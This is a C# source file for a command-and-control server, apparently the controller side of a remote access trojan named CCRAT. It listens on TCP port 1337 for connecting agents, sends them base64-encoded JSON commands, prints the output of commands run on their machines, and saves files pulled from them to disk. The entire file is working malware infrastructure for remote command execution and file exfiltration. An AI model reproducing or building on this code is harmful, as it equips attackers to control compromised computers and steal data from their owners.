using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CCRAT_C2
{
    class C2Server
    {
        private Dictionary<Guid, TcpClient> clientConnections = new Dictionary<Guid, TcpClient>();
        public void Listen()
        {
            IPAddress zeros = IPAddress.Parse("0.0.0.0");
            TcpListener server = new TcpListener(zeros, 1337);
            server.Start();
            Task t = new Task(() => AcceptLoop(server));
            t.Start();
        }
        private void AcceptLoop(TcpListener s)
        {
            while (true)
            {
                TcpClient clientConnection = s.AcceptTcpClient();
                Task t = new Task(() => AddClient(clientConnection));
                t.Start();
            }
        }
        private void AddClient(TcpClient clientConnection)
        {
            StreamReader reader = new StreamReader(clientConnection.GetStream());
            string encodedHandshake = reader.ReadLine();
            Guid id = new Guid(Convert.FromBase64String(encodedHandshake));
            clientConnections.Add(id, clientConnection);
            Console.WriteLine("New client connected with GUID of " + id.ToString());
            Console.WriteLine("Started listening for data from new client... ");
            while (true)
            {
                string line = reader.ReadLine();
                string json = Encoding.UTF8.GetString(Convert.FromBase64String(line));
                CommsPackage cp = JsonConvert.DeserializeObject<CommsPackage>(json);
                ProcessReply(cp, id);
            }
        }

        private void ProcessReply(CommsPackage reply, Guid agent)
        {
            Console.WriteLine("[+] Got some data from agent: " + agent.ToString());
            Console.WriteLine("[+] Data type: " + reply.Command);
            switch (reply.Command)
            {
                case "exec":
                    Console.WriteLine(Encoding.UTF8.GetString(reply.Data));
                    break;
                case "download":
                    FileInfo fi = JsonConvert.DeserializeObject<FileInfo>(Encoding.UTF8.GetString(reply.Data));
                    
                    try
                    {
                        File.WriteAllBytes(Path.GetFileName(fi.Path), fi.Data);
                    }
                    catch
                    {
                        Console.WriteLine("An error occurred in file write handling");
                    }
                    break;
                default:
                    break;
            }
        }

        public void SendCommand(Guid agent, CommsPackage cp)
        {
            Console.WriteLine("Marshalling command");
            TcpClient client;

            if(!clientConnections.TryGetValue(agent, out client))
            {
                Console.WriteLine("Agent with guid "+agent.ToString()+" not connected!");
                return;
            }

            string payload = JsonConvert.SerializeObject(cp);

            payload = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));

            StreamWriter stream = new StreamWriter(client.GetStream());

            stream.WriteLine(payload);
            stream.Flush();

            Console.WriteLine("Payload sent");
        }

    }
}
